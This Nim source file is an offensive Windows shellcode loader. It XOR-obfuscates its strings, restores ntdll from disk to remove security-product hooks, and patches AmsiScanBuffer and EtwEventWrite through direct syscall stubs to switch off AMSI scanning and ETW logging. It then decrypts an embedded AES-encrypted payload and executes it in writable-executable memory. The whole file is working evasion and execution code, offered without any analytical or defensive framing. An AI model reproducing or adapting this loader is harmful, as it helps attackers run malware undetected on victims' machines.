import winim/lean
#from dynlib import LibHandle, loadLib
# something seams to be still missing here
#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, CreateFileA, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, GetFileSize, HeapAlloc, GetProcessHeap, ReadFile, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, GetCurrentProcess, GetCurrentProcessId, OpenProcess, PROCESS_ALL_ACCESS, FALSE, VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, VirtualProtect, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES, NtClose
import dynlib
import strformat
from os import sleep, paramCount, paramStr
from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import base64
import strutils
import ptr_math
import strenc

var success: BOOL

const encstring = slurp"enc.blob"

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
    else:
        result = s

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]
import winim/lean

from winim import MODULEINFO, GetModuleInformation

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo obf("Failed calling VirtualProtect ") & fmt"({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo obf("Failed resetting memory back to it's orignal protections ") & fmt"({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true


when isMainModule:
  var result = ntdllunhook()
  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"

var enctext: seq[byte] = toByteSeq(encstring)
var key: array[aes256.sizeKey, byte]
var envkey: string = decode("VEFSR0VURE9NQUlO")
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode("f7oJVJq/13qfXtfCH49t4g==")
# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Ecnrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

var 
    SYSCALL_STUB_SIZE: int = 23;

proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
    return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)

proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
    var
        file: HANDLE
        fileSize: DWORD
        bytesRead: DWORD
        fileData: LPVOID
        ntdllString: LPCSTR = "C:\\windows\\system32\\ntdll.dll"
        nullHandle: HANDLE
    file = CreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
    fileSize = GetFileSize(file, nil)
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
    ReadFile(file, fileData, fileSize, addr bytesRead, nil)

    var
        dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
        imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
        exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
        textSection: PIMAGE_SECTION_HEADER = section
        rdataSection: PIMAGE_SECTION_HEADER = section

    let low: uint16 = 0

    for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
        var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if ".rdata" in toString(ntdllSectionHeader.Name):
            rdataSection = ntdllSectionHeader
        
    var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))

    var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
    var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
    var stubFound: BOOL = 0
    var oldProtection: DWORD = 0
    let low2: int = 0
    for low2 in 0 ..< exportDirectory.NumberOfNames:
        var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
        var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
        var compare: int = lstrcmpA(functionNameResolved,functionName)
        if (compare == 0):
            #echo functionNameResolved
            copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
            stubFound = 1
            #echo obf("Found Syscall STUB!")
    return stubFound

# Unmanaged NTDLL Declarations
type myNtProtectVM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
type myNtWriteVM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib(obf("amsi"))
    if isNil(amsi):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    cs = amsi.symAddr(obf("AmsiScanBuffer")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    
    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    echo obf("[*] Applying Syscall AMSI patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    # Fails for some reason
    #success = NtProtectVirtualMemory(hProcess,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
    echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib(obf("ntdll"))
    if isNil(ntdll):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    echo obf("[*] Applying Syscall ETW patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)

    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
# Unmanaged NTDLL Declarations
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

from winlean import getCurrentProcess

proc pwndem[byte](friendlycode: openarray[byte]): void =

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = getCurrentProcess()

    let syscallStub_NtAlloc = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var oldProtection: DWORD = 0
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var tHandle: HANDLE
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
    var ds: LPVOID
    
    cid.UniqueProcess = tProcess

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);


    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
  
    cid.UniqueProcess = tProcess

    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten);

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")
    
    let f = cast[proc(){.nimcall.}](ds)
    f()

    status = NtClose(pHandle)


when isMainModule:
     pwndem(dectext)

